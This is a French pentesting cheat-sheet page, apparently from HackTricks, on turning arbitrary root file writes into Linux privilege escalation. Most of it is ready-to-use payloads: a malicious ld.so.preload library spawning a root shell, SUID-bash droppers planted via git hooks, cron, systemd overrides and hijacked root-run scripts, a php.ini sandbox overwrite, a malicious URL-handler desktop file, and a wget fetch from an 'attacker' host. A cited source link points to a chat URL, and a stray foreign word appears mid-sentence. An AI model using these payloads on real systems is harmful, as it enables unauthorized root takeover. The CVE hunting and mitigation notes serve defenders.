# Écriture arbitraire de fichier en tant que root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ce fichier se comporte comme la variable d’environnement **`LD_PRELOAD`** mais il fonctionne aussi dans les binaires **SUID**.\
Si vous pouvez le créer ou le modifier, vous pouvez simplement ajouter un **chemin vers une bibliothèque qui sera chargée** avec chaque binaire exécuté.

Par exemple : `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sont des **scripts** qui sont **exécutés** lors de divers **événements** dans un dépôt git, comme lorsqu’un commit est créé, un merge... Donc si un **script ou utilisateur privilégié** effectue souvent ces actions et qu’il est possible d’**écrire dans le dossier `.git`**, cela peut être utilisé pour faire de la **privesc**.

Par exemple, il est possible de **générer un script** dans un dépôt git dans **`.git/hooks`** afin qu’il soit toujours exécuté lorsqu’un nouveau commit est créé :
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Fichiers Cron & Time

Si vous pouvez **écrire des fichiers liés à cron que root exécute**, vous pouvez généralement obtenir une exécution de code la prochaine fois que la tâche s’exécute. Les cibles intéressantes incluent :

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Le propre crontab de root dans `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- Les timers `systemd` et les services qu’ils déclenchent

Vérifications rapides :
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Chemins d’abus typiques :

- **Ajouter un nouveau cron job root** à `/etc/crontab` ou à un fichier dans `/etc/cron.d/`
- **Remplacer un script** déjà exécuté par `run-parts`
- **Backdoor un timer target existant** en modifiant le script ou le binaire qu’il lance

Exemple minimal de payload cron :
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Si vous pouvez seulement écrire dans un répertoire cron utilisé par `run-parts`, déposez-y plutôt un fichier exécutable :
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes :

- `run-parts` ignore généralement les noms de fichiers contenant des points, donc privilégiez des noms comme `backup` au lieu de `backup.sh`.
- Certaines distros utilisent `anacron` ou des timers `systemd` à la place de cron classique, mais l’idée d’abus est la même : **modifier ce que root exécutera plus tard**.

### Service & Socket files

Si vous pouvez écrire des fichiers d’unité **`systemd`** ou des fichiers référencés par celles-ci, vous pouvez peut-être obtenir une exécution de code en tant que root en rechargeant et redémarrant l’unité, ou en attendant que le chemin d’activation du service/socket se déclenche.

Les cibles intéressantes incluent :

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths loaded by a root service

Quick checks:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Chemins d’abus courants :

- **Écraser `ExecStart=`** dans une unité de service appartenant à root que vous pouvez modifier
- **Ajouter un override drop-in** avec un `ExecStart=` malveillant et effacer d’abord l’ancien
- **Backdoor le script/binaire** déjà référencé par l’unité
- **Détourner un service activé par socket** en modifiant le fichier `.service` correspondant qui démarre lorsque le socket reçoit une connexion

Exemple d’override malveillant :
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flux d'activation typique :
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Si vous ne pouvez pas redémarrer vous-même les services, mais que vous pouvez modifier une unité activée par socket, il peut suffire d’**attendre une connexion client** pour déclencher l’exécution du service backdoor en root.

### Écraser un `php.ini` restrictif utilisé par un sandbox PHP privilégié

Certains daemons personnalisés valident le PHP fourni par l’utilisateur en exécutant `php` avec un **`php.ini` restreint** (par exemple, `disable_functions=exec,system,...`). Si le code sandboxé dispose encore d’**une primitive d’écriture** (comme `file_put_contents`) et que vous pouvez atteindre le **chemin exact du `php.ini`** utilisé par le daemon, vous pouvez **écraser cette configuration** pour lever les restrictions, puis soumettre un second payload qui s’exécute avec des privilèges élevés.

Flux typique :

1. Le premier payload écrase la configuration du sandbox.
2. Le second payload exécute du code une fois les fonctions dangereuses réactivées.

Exemple minimal (remplacez le chemin utilisé par le daemon) :
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Si le daemon s’exécute en tant que root (ou valide avec des chemins appartenant à root), la seconde exécution donne un contexte root. C’est essentiellement une **élévation de privilèges via un overwrite de configuration** lorsque le runtime sandboxé peut encore écrire des fichiers.

### binfmt_misc

Le fichier situé dans `/proc/sys/fs/binfmt_misc` indique quel binaire doit exécuter quel type de fichier. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

Un attaquant disposant de permissions d’écriture dans les répertoires de configuration d’une victime peut facilement remplacer ou créer des fichiers qui modifient le comportement du système, entraînant une exécution de code non इच्छue. En modifiant le fichier `$HOME/.config/mimeapps.list` pour faire pointer les gestionnaires d’URL HTTP et HTTPS vers un fichier malveillant (par exemple, en définissant `x-scheme-handler/http=evil.desktop`), l’attaquant s’assure que **cliquer sur n’importe quel lien http ou https déclenche le code spécifié dans ce fichier `evil.desktop`**. Par exemple, après avoir placé le code malveillant suivant dans `evil.desktop` dans `$HOME/.local/share/applications`, tout clic sur une URL externe exécute la commande intégrée :
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Pour plus d'informations, consultez [**ce post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) où il a été utilisé pour exploiter une vulnérabilité réelle.

### Root exécutant des scripts/binaires inscriptibles par l'utilisateur

Si un workflow privilégié exécute quelque chose comme `/bin/sh /home/username/.../script` (ou tout binaire dans un répertoire appartenant à un utilisateur non privilégié), vous pouvez le détourner :

- **Détecter l’exécution :** surveillez les processus avec [pspy](https://github.com/DominicBreuker/pspy) pour repérer root invoquant des chemins contrôlés par l’utilisateur :
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirmer l’écriture :** assurez-vous que le fichier cible et son répertoire sont tous deux possédés/inscriptibles par votre utilisateur.
- **Détourner la cible :** sauvegardez le binaire/script original et déposez un payload qui crée un shell SUID (ou toute autre action root), puis restaurez les permissions :
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Déclencher l’action privilégiée** (par ex., appuyer sur un bouton UI qui lance le helper). Quand root ré-exécute le chemin détourné, récupérez le shell avec privilèges élevés avec `./rootshell -p`.

### Modification de fichier uniquement dans le page cache de binaires privilégiés

Certains bugs kernel ne modifient pas le fichier **sur disque**. À la place, ils permettent de modifier uniquement la **copie en page cache** d’un fichier lisible. Si vous pouvez cibler un binaire **setuid** ou autrement **exécuté par root**, l’exécution suivante peut lancer des bytes contrôlés par l’attaquant depuis la mémoire et élever les privilèges même si le hash du fichier sur disque n’a pas changé.

C’est utile à considérer comme un **runtime-only file write primitive** :

- **Le disque reste propre** : l’inode et les bytes sur disque ne changent pas
- **La mémoire est modifiée** : les processus qui lisent/exécutent la page en cache obtiennent le contenu modifié par l’attaquant
- **L’effet est temporaire** : le changement disparaît après redémarrage ou éviction du cache

Cette primitive se situe entre l’**arbitrary file write** classique et les anciens bugs d’**abuse de page cache** comme Dirty COW / Dirty Pipe :

- Dirty COW reposait sur une race
- Dirty Pipe avait des contraintes de position d’écriture
- Une primitive page-cache-only peut être plus fiable si le chemin vulnérable permet des écritures directes dans des pages mappées en cache et liées à des fichiers

#### Generic privesc flow

1. Obtenir une primitive kernel capable d’écrire dans des **file-backed page cache pages**
2. L’utiliser contre un **binaire privilégié lisible** ou un autre fichier exécuté par root
3. Déclencher l’exécution **avant** que la page ne soit évincée du cache
4. Obtenir l’exécution de code en tant que root pendant que le fichier sur disque semble toujours non modifié

Cibles typiques à forte valeur :

- Binaires **setuid-root**
- Helpers lancés par des **root services**
- Binaires couramment exécutés depuis des **containers partageant le kernel/page cache de l’hôte**

#### Chemin d’exemple AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) est un bon exemple de cette classe. Le chemin vulnérable se trouvait dans l’API userspace crypto Linux (`AF_ALG` / `algif_aead`) :

- `splice()` peut déplacer des références vers des pages du page cache depuis un fichier lisible vers la scatterlist TX crypto
- le chemin de déchiffrement in-place `algif_aead` réutilisait les buffers source et destination
- `authencesn` écrivait ensuite dans la région de tag de destination
- quand cette région référençait encore des pages splicées liées à un fichier, l’écriture arrivait dans le **page cache du fichier cible**

Donc la technique intéressante n’est pas la CVE elle-même, mais le pattern :

- **alimenter des pages cache liées à un fichier dans un sous-système kernel**
- faire en sorte que le sous-système les **traite comme une sortie inscriptible**
- déclencher un petit overwrite contrôlé en mémoire

Le PoC public utilisait des **écritures de 4 bytes** répétées pour patcher `/usr/bin/su` en mémoire puis l’exécuter.

#### Exposure and hunting

Si vous suspectez cette classe de bug, ne vous fiez pas uniquement aux contrôles d’intégrité du disque. Vérifiez aussi :
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` peut être chargeable/déchargeable en tant que module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: l'interface est intégrée au kernel
- les binaires setuid sont de bonnes cibles car un patch uniquement dans le page-cache peut suffire à transformer un accès local en root

#### Réduction de la surface d'attaque pour le chemin `algif_aead`

Si l'interface vulnérable est fournie par un module chargeable :
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
S’il est compilé dans le kernel, certaines disclosures ont signalé bloquer le chemin init avec :
```bash
initcall_blacklist=algif_aead_init
```
Ce type de mitigation vaut aussi la peine d’être retenu pour d’autres LPE du kernel : si l’exploitation dépend d’une interface optionnelle spécifique, désactiver ou blacklister cette interface peut casser la chaîne d’exploitation même avant qu’une mise à niveau complète du kernel ne soit disponible.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
